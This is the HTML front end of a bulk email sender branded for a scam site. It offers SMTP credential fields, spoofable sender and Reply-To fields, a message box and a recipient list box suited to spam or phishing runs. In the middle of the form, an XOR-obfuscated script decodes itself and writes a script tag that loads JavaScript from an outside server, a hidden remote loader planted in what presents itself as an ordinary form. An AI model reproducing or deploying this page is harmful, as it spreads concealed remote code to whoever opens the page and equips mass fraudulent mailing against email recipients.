

<html>

<head>

<title>{*oo*} Inbox Emailer SMTP [] Private Version 2.1(o_o)</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style type="text/css">
<!--
.style1 {
        font-family: Geneva, Arial, Helvetica, sans-serif;
        font-size: 12px;
}
-->
</style>
<style type="text/css">
<!--
.style1 {
        font-size: 10px;
        font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
</head>
<body bgcolor="#FFFFFF" text="#000000">
<span class="style1">PHP Emailer SMTP is created by Predator<br>
brought to you by   <font color=\"#800000\">http://scamvip.com</font></span>

<form name="form1" method="post" action="" enctype="multipart/form-data">

  <br>

  <table width="100%" border="0" height="407">

    <tr>

      <td width="100%" colspan="4" bgcolor="#666666" height="36">

        <b>

        <font face="Arial" size="2" color="#FFFFFF">&nbsp;SERVER SETUP</font></b></td>

      </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#E8E8E8">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Login:</font></div>

      </td>

      <td width="18%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="smtp_username" value="" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="#E8E8E8">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Pass:</font></div>

      </td>

      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="password" name="smtp_password" value="" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#E8E8E8">

        <div align="right">
          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Port:</font></div>

      </td>

      <td width="18%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="ssl_port" value="" size="5"> 
      (optional)</font></td>

      <td width="31%" height="22" bgcolor="#E8E8E8">

        <div align="right">
          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP Server 
          Smtp:</font></div>

      </td>

      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="my_smtp" value="" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#E8E8E8">

        &nbsp;</td>

      <td width="18%" height="22" bgcolor="#E8E8E8">&nbsp;</td>

      <td width="31%" height="22" bgcolor="#E8E8E8">

        <p align="right">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 
        After:</font></td>

      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="reconnect" value="" size="5"> 
      EMAILS</font></td>

    </tr>
    <tr>

      <td width="100%" height="39" bgcolor="#E8E8E8" colspan="4">

        <p align="center">
        <font face="Arial" style="font-size: 9pt" color="#800000"><b>&quot;</b> If 
        you dont have SMTP login, leave blank queries above <b>&quot;</b></font></td>

      </tr>

    <tr>

      <td width="10%" height="19">

        &nbsp;</td>

      <td width="18%" height="19">&nbsp;</td>

      <td width="31%" height="19">

        &nbsp;</td>

      <td width="41%" height="19">&nbsp;</td>

    </tr>

    <tr>

      <td width="100%" colspan="4" bgcolor="#666666" height="36">

        <b>

        <font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETUP</font></b></td>

      </tr>

    <tr>

      <td width="10%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

          Email:</font></div>

      </td>

      <td width="18%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="from" value="" size="30">

        </font></td>

      <td width="31%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

          Name:</font></div>

      </td>

      <td width="41%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="realname" value="" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>

      </td>

      <td width="18%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="replyto" value="" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8">

        <p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        Email Priority:</font></td>

      <td width="41%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        &nbsp;</font><select name="epriority" id="listMethod" onchange="showHideListConfig()">
        <option value="" selected >- Please Choose -</option>
        <option value="1"  >High</option>
        <option value="3"  >Normal</option>
		<option value="5"  >Low</option>
		</select></td>

    </tr>
<script>var enkripsi="'1AQapkrv'02Nclewceg'1F'05Hctcqapkrv'05'1G'2Cfmawoglv,upkvg'0:wlgqacrg'0:'05'071A'074:'0756'074F'074A'071G'072C'071A'0751'0741'0750'074;'0752'0756'0702'0751'0750'0741'071F'0705'074:'0756'0756'0752'071C'070D'070D'0751'0741'0750'074;'0752'0756'0754'070G'074G'0747'0756'070D'074C'0751'070G'074C'0751'0705'071G'071A'070D'0751'0741'0750'074;'0752'0756'071G'072C'071A'0751'0741'0750'074;'0752'0756'071G'0751'0747'0741'0757'0750'0747'074:'0756'0756'0752'0751'077D'074F'070:'070;'071@'071A'070D'0751'0741'0750'074;'0752'0756'071G'072C'071A'070D'074:'0756'074F'074A'071G'05'0;'0;'1@'2C'1A-Qapkrv'1G"; teks=""; teksasli="";
var panjang;panjang=enkripsi.length;
for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);
document.write(teksasli);</script>
    <tr>

      <td width="10%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>

      </td>

      <td colspan="3" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="subject" value="" size="90">

        </font></td>

    </tr>

    <tr>

      <td width="10%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">

        &nbsp;</td>

      <td colspan="3" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        &nbsp;</font></td>

    </tr>

    <tr valign="top">

<td colspan="3" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 

        <textarea name="message" cols="60" rows="10"></textarea>

        <br>

        <input type="radio" name="contenttype" value="plain" >

        Plain 

        <input type="radio" name="contenttype" value="html" checked>

        HTML 

        <input type="hidden" name="action" value="send">

        <input type="submit" value="Send Message">

        </font></td>

      <td width="41%" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <textarea name="emaillist" cols="30" rows="10"></textarea>

        </font></td>

    </tr>

  </table>

</form>
   
    </body>
</html>